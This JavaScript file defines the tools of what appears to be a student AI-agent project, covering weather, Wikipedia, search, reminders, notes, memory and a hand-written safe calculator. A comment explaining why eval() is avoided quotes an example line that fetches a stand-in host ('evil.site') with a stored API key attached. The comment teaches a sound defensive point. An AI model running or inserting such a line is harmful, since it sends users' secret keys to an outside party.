// =====================================================================
// tools.js  -  the HANDS of the agent
// ---------------------------------------------------------------------
// A "tool" is a normal JavaScript function the AI is ALLOWED to ask for.
// The AI cannot run code itself. It can only reply: "please call
// get_weather with {city: 'Mysuru'}". OUR code then runs the real function
// and sends the result back. That is what "function calling" means.
//
// Every tool has:
//   name        - what the AI writes to call it
//   description - tells the AI WHEN to use it (write these carefully!)
//   parameters  - the inputs, described as JSON Schema
//   run(args, ctx) - the real code. ctx gives access to memory, the UI, fetch.
//
// All APIs used here are FREE, need NO key, and allow browser calls (CORS).
// =====================================================================

const UA_HEADERS = { "Api-User-Agent": "ShadowAgent/1.0 (student project)" };

export const tools = [
  // ------------------------------------------------------------ time & date
  {
    name: "get_time_date",
    description: "Get the current local date, time and day of the week.",
    parameters: { type: "object", properties: {} },
    run: async () => {
      const now = new Date();
      return {
        date: now.toLocaleDateString("en-IN", { weekday: "long", day: "numeric", month: "long", year: "numeric" }),
        time: now.toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit" }),
      };
    },
  },

  // -------------------------------------------------------------- calculator
  {
    name: "calculator",
    description: "Calculate a maths expression exactly. Always use this for arithmetic instead of guessing. Supports + - * / % ^ ( ) sqrt sin cos tan log ln abs pi e.",
    parameters: {
      type: "object",
      properties: { expression: { type: "string", description: "e.g. '(25*4)+sqrt(16)' or '0.18*2500'" } },
      required: ["expression"],
    },
    run: async ({ expression }) => ({ expression, result: calculate(expression) }),
  },

  // ----------------------------------------------------------------- weather
  {
    name: "get_weather",
    description: "Get the current weather and today's forecast for a city.",
    parameters: {
      type: "object",
      properties: { city: { type: "string", description: "city name, e.g. 'Shivamogga'. Use the user's home city if they don't say one." } },
      required: ["city"],
    },
    run: async ({ city }, ctx) => {
      // Step 1: city name -> latitude/longitude (Open-Meteo geocoding, free, no key)
      const geo = await getJSON(ctx.fetch, `https://geocoding-api.open-meteo.com/v1/search?count=1&language=en&name=${encodeURIComponent(city)}`);
      const place = geo.results?.[0];
      if (!place) return { error: `I couldn't find a place called ${city}.` };
      // Step 2: lat/lon -> weather (Open-Meteo forecast, free, no key)
      const url = `https://api.open-meteo.com/v1/forecast?latitude=${place.latitude}&longitude=${place.longitude}` +
        "&current=temperature_2m,relative_humidity_2m,apparent_temperature,weather_code,wind_speed_10m" +
        "&daily=temperature_2m_max,temperature_2m_min,precipitation_probability_max&timezone=auto&forecast_days=1";
      const w = await getJSON(ctx.fetch, url);
      return {
        place: `${place.name}, ${place.admin1 || ""} ${place.country || ""}`.trim(),
        temperature_c: w.current.temperature_2m,
        feels_like_c: w.current.apparent_temperature,
        humidity_percent: w.current.relative_humidity_2m,
        wind_kmh: w.current.wind_speed_10m,
        conditions: WEATHER_CODES[w.current.weather_code] || `code ${w.current.weather_code}`,
        today_max_c: w.daily.temperature_2m_max[0],
        today_min_c: w.daily.temperature_2m_min[0],
        rain_chance_percent: w.daily.precipitation_probability_max[0],
      };
    },
  },

  // --------------------------------------------------------------- wikipedia
  {
    name: "wikipedia",
    description: "Get a short factual summary of a person, place, thing or topic from Wikipedia.",
    parameters: {
      type: "object",
      properties: { topic: { type: "string", description: "e.g. 'Kuvempu', 'Mysore Palace', 'Machine learning'" } },
      required: ["topic"],
    },
    run: async ({ topic }, ctx) => {
      // Find the best matching article title first (handles spelling/case).
      const title = await findWikipediaTitle(ctx.fetch, topic);
      if (!title) return { error: `No Wikipedia article found for ${topic}.` };
      const s = await getJSON(ctx.fetch, `https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(title)}`, UA_HEADERS);
      return { title: s.title, summary: s.extract, url: s.content_urls?.desktop?.page };
    },
  },

  // -------------------------------------------------------------- web search
  {
    name: "web_search",
    description: "Search the web for facts, definitions and general knowledge (DuckDuckGo instant answers plus Wikipedia search). Not for live news or prices.",
    parameters: {
      type: "object",
      properties: { query: { type: "string", description: "what to search for" } },
      required: ["query"],
    },
    run: async ({ query }, ctx) => {
      const results = [];
      // 1) DuckDuckGo Instant Answer API: free, no key, gives a short answer for many topics.
      try {
        const d = await getJSON(ctx.fetch, `https://api.duckduckgo.com/?format=json&no_html=1&skip_disambig=1&q=${encodeURIComponent(query)}`);
        if (d.Answer) results.push({ source: "DuckDuckGo", text: String(d.Answer) });
        if (d.AbstractText) results.push({ source: d.AbstractSource || "DuckDuckGo", text: d.AbstractText, url: d.AbstractURL });
        for (const t of (d.RelatedTopics || []).slice(0, 3)) if (t.Text) results.push({ source: "DuckDuckGo", text: t.Text, url: t.FirstURL });
      } catch { /* DuckDuckGo failed - Wikipedia below still works */ }
      // 2) Wikipedia full-text search: always has something.
      const w = await getJSON(ctx.fetch, `https://en.wikipedia.org/w/api.php?action=query&list=search&format=json&origin=*&srlimit=3&srsearch=${encodeURIComponent(query)}`);
      for (const r of w.query?.search || []) {
        results.push({ source: "Wikipedia", title: r.title, text: r.snippet.replace(/<[^>]+>/g, ""), url: `https://en.wikipedia.org/wiki/${encodeURIComponent(r.title.replace(/ /g, "_"))}` });
      }
      return results.length ? { results: results.slice(0, 6) } : { error: "No results found." };
    },
  },

  // ------------------------------------------------------------ open website
  {
    name: "open_website",
    description: "Open a website in a new browser tab (e.g. youtube, gmail, github, or any address like python.org). If it isn't a site, a Google search is opened.",
    parameters: {
      type: "object",
      properties: { site: { type: "string", description: "site name or web address" } },
      required: ["site"],
    },
    run: async ({ site }, ctx) => {
      const url = siteToUrl(site);
      ctx.ui.openUrl(url);
      return { opened: url };
    },
  },

  // ------------------------------------------------------------ play youtube
  {
    name: "play_youtube",
    description: "Find a song or video on YouTube and open it.",
    parameters: {
      type: "object",
      properties: { query: { type: "string", description: "what to play, e.g. 'lofi study music'" } },
      required: ["query"],
    },
    run: async ({ query }, ctx) => {
      const url = `https://www.youtube.com/results?search_query=${encodeURIComponent(query)}`;
      ctx.ui.openUrl(url);
      return { opened: url, note: "YouTube search results opened; tap the first video to play." };
    },
  },

  // ---------------------------------------------------------------- reminders
  {
    name: "set_reminder",
    description: "Set a reminder. Give EITHER minutes from now OR a clock time (24-hour HH:MM).",
    parameters: {
      type: "object",
      properties: {
        message: { type: "string", description: "what to remind about" },
        minutes: { type: "number", description: "minutes from now, e.g. 10" },
        time: { type: "string", description: "clock time like '18:30'" },
      },
      required: ["message"],
    },
    run: async ({ message, minutes, time }, ctx) => {
      const when = reminderTime({ minutes, time }, new Date());
      if (!when) return { error: "Tell me when: in how many minutes, or at what time." };
      const r = ctx.memory.addReminder(message, when.getTime());
      ctx.ui.scheduleReminder?.(r);
      return { reminder_set: message, at: when.toLocaleString("en-IN", { hour: "2-digit", minute: "2-digit", day: "numeric", month: "short" }) };
    },
  },
  {
    name: "list_reminders",
    description: "List the reminders that are still pending.",
    parameters: { type: "object", properties: {} },
    run: async (_a, ctx) => ({
      reminders: ctx.memory.pendingReminders().map((r) => ({ message: r.message, at: new Date(r.at).toLocaleString("en-IN") })),
    }),
  },

  // -------------------------------------------------------------------- notes
  {
    name: "take_note",
    description: "Save a note for the user (a to-do, an idea, anything they want written down).",
    parameters: {
      type: "object",
      properties: { text: { type: "string", description: "the note" } },
      required: ["text"],
    },
    run: async ({ text }, ctx) => { ctx.memory.addNote(text); return { saved: text, total_notes: ctx.memory.notes().length }; },
  },
  {
    name: "read_notes",
    description: "Read back the user's saved notes.",
    parameters: { type: "object", properties: {} },
    run: async (_a, ctx) => ({ notes: ctx.memory.notes().map((n) => n.text) }),
  },

  // ---------------------------------------------------------- long-term memory
  {
    name: "remember_fact",
    description: "Permanently remember a fact about the user (birthday, favourite food, college, goals...). Use when the user says 'remember...' or shares personal info.",
    parameters: {
      type: "object",
      properties: { fact: { type: "string", description: "the fact as a short sentence, e.g. 'User's birthday is 12 March'" } },
      required: ["fact"],
    },
    run: async ({ fact }, ctx) => { ctx.memory.addFact(fact); return { remembered: fact }; },
  },
  {
    name: "forget_fact",
    description: "Forget a fact the user no longer wants remembered.",
    parameters: {
      type: "object",
      properties: { fact: { type: "string", description: "words from the fact to forget" } },
      required: ["fact"],
    },
    run: async ({ fact }, ctx) => ({ forgotten: ctx.memory.forgetFact(fact) }),
  },

  // -------------------------------------------------------------- device info
  {
    name: "device_info",
    description: "Get this device's battery level, charging state, internet status and screen size.",
    parameters: { type: "object", properties: {} },
    run: async (_a, ctx) => {
      const nav = ctx.navigator || {};
      const info = { online: nav.onLine ?? true, platform: nav.userAgentData?.platform || nav.platform || "unknown" };
      if (nav.getBattery) { // Battery API: Chrome/Edge/Android only
        const b = await nav.getBattery();
        info.battery_percent = Math.round(b.level * 100);
        info.charging = b.charging;
      } else info.battery = "not available in this browser";
      if (ctx.screen) info.screen = `${ctx.screen.width}x${ctx.screen.height}`;
      return info;
    },
  },
];

// Find a tool by name and run it safely. ALWAYS returns an object, never throws,
// so one broken tool can't crash the whole agent; the AI just reads the error.
export async function runTool(name, args, ctx) {
  const tool = tools.find((t) => t.name === name);
  if (!tool) return { error: `There is no tool named ${name}. Tools: ${tools.map((t) => t.name).join(", ")}` };
  try {
    return await tool.run(args || {}, ctx);
  } catch (e) {
    return { error: `${name} failed: ${e.message}` };
  }
}

// =====================================================================
// Helper functions used by the tools (exported so the tests can check them)
// =====================================================================

async function getJSON(fetchFn, url, headers = {}) {
  const res = await fetchFn(url, { headers });
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return res.json();
}

async function findWikipediaTitle(fetchFn, topic) {
  const url = `https://en.wikipedia.org/w/api.php?action=opensearch&format=json&origin=*&limit=1&search=${encodeURIComponent(topic)}`;
  const data = await getJSON(fetchFn, url);
  return data[1]?.[0] || null; // opensearch returns [query, [titles], [descs], [urls]]
}

const SITES = {
  youtube: "https://www.youtube.com", google: "https://www.google.com", gmail: "https://mail.google.com",
  github: "https://github.com", whatsapp: "https://web.whatsapp.com", instagram: "https://www.instagram.com",
  linkedin: "https://www.linkedin.com", chatgpt: "https://chatgpt.com", wikipedia: "https://www.wikipedia.org",
  maps: "https://maps.google.com", "kuvempu university": "https://kuvempu.ac.in",
};

export function siteToUrl(site) {
  const s = String(site).trim().toLowerCase();
  if (SITES[s]) return SITES[s];
  if (/^https?:\/\//.test(s)) return s;
  if (/^[\w-]+(\.[\w-]+)+(\/\S*)?$/.test(s)) return `https://${s}`; // looks like "python.org"
  return `https://www.google.com/search?q=${encodeURIComponent(site)}`;
}

export function reminderTime({ minutes, time }, now) {
  if (minutes !== undefined && minutes !== null && !isNaN(Number(minutes)) && Number(minutes) > 0) {
    return new Date(now.getTime() + Number(minutes) * 60000);
  }
  const m = /^(\d{1,2}):(\d{2})$/.exec(String(time || "").trim());
  if (m) {
    const d = new Date(now);
    d.setHours(Number(m[1]), Number(m[2]), 0, 0);
    if (d <= now) d.setDate(d.getDate() + 1); // time already passed today -> tomorrow
    return d;
  }
  return null;
}

// Weather codes from Open-Meteo's documentation (WMO codes) -> words.
const WEATHER_CODES = {
  0: "clear sky", 1: "mainly clear", 2: "partly cloudy", 3: "overcast", 45: "fog", 48: "fog",
  51: "light drizzle", 53: "drizzle", 55: "heavy drizzle", 61: "light rain", 63: "rain", 65: "heavy rain",
  71: "light snow", 73: "snow", 75: "heavy snow", 80: "rain showers", 81: "heavy showers", 82: "violent showers",
  95: "thunderstorm", 96: "thunderstorm with hail", 99: "thunderstorm with heavy hail",
};

// ---------------------------------------------------------------------
// A SAFE calculator. We never use eval() on text from the AI or the user:
// eval("fetch('https://evil.site?k='+localStorage.geminiKey)") would steal
// your key! (Like the SQL injection idea: never run untrusted input as code.)
// Instead we read the expression ourselves with a tiny "recursive descent
// parser" that only understands numbers, operators and a few functions.
// ---------------------------------------------------------------------
const FUNCS = {
  sqrt: Math.sqrt, abs: Math.abs, ln: Math.log, log: Math.log10, round: Math.round,
  sin: (x) => Math.sin((x * Math.PI) / 180), cos: (x) => Math.cos((x * Math.PI) / 180), tan: (x) => Math.tan((x * Math.PI) / 180),
};

export function calculate(input) {
  const src = String(input).replace(/×|x/g, "*").replace(/÷/g, "/").replace(/,/g, "").toLowerCase();
  const tokens = src.match(/\d+\.?\d*|\.\d+|[a-z]+|[-+*/%^()]/g) || [];
  if (tokens.join("") !== src.replace(/\s+/g, "")) throw new Error("only numbers and maths symbols are allowed");
  let i = 0;
  const peek = () => tokens[i];
  const next = () => tokens[i++];

  // Grammar (lowest priority first):
  //   expr   = term   { (+|-) term }
  //   term   = power  { (*|/|%) power }
  //   power  = unary  [ ^ power ]
  //   unary  = [-|+] unary | atom
  //   atom   = number | constant | func ( expr ) | ( expr )
  function expr() { let v = term(); while (peek() === "+" || peek() === "-") v = next() === "+" ? v + term() : v - term(); return v; }
  function term() {
    let v = power();
    while (["*", "/", "%"].includes(peek())) {
      const op = next(), r = power();
      v = op === "*" ? v * r : op === "/" ? v / r : v % r;
    }
    return v;
  }
  function power() { const b = unary(); if (peek() === "^") { next(); return b ** power(); } return b; }
  function unary() { if (peek() === "-") { next(); return -unary(); } if (peek() === "+") { next(); return unary(); } return atom(); }
  function atom() {
    const t = next();
    if (t === undefined) throw new Error("expression ended too early");
    if (/^[\d.]/.test(t)) return parseFloat(t);
    if (t === "pi") return Math.PI;
    if (t === "e") return Math.E;
    if (t === "(") { const v = expr(); if (next() !== ")") throw new Error("missing )"); return v; }
    if (FUNCS[t]) {
      if (next() !== "(") throw new Error(`${t} needs brackets, like ${t}(9)`);
      const v = expr();
      if (next() !== ")") throw new Error("missing )");
      return FUNCS[t](v);
    }
    throw new Error(`unknown symbol '${t}'`);
  }

  const value = expr();
  if (i < tokens.length) throw new Error(`unexpected '${tokens[i]}'`);
  if (!isFinite(value)) throw new Error("the answer is not a finite number (division by zero?)");
  return Math.round(value * 1e10) / 1e10; // hide tiny floating point noise like 0.30000000000000004
}
